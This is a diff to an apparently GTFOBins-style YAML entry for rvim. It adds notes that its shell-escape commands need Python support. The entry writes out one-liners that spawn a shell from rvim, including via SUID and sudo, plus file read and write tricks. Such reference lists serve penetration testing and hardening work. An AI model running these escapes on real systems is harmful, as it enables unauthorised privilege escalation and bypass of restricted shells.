@@ -1,10 +1,11 @@
 ---
-description: 'From the manual: with rvim "It will not be possible to start shell commands".'
 functions:
   shell:
-    - code: rvim -c ':py import os;os.system("sh")'
+    - description: This requires that rvim is compiled with Python support.
+      code: rvim -c ':py import os;os.system("sh")'
   file-write:
-    - code: |
+    - description: This requires that rvim is compiled with Python support.
+      code: |
         rvim file_to_write
         iDATA
         ^[
@@ -12,7 +13,9 @@ functions:
   file-read:
     - code: rvim file_to_read
   suid:
-    - code: ./rvim -c ':py import os;os.system("sh")'
+    - description: This requires that rvim is compiled with Python support.
+      code: ./rvim -c ':py import os;os.system("sh")'
   sudo:
-    - code: sudo rvim -c ':py import os;os.system("sh")'
+    - description: This requires that rvim is compiled with Python support.
+      code: sudo rvim -c ':py import os;os.system("sh")'
 ---
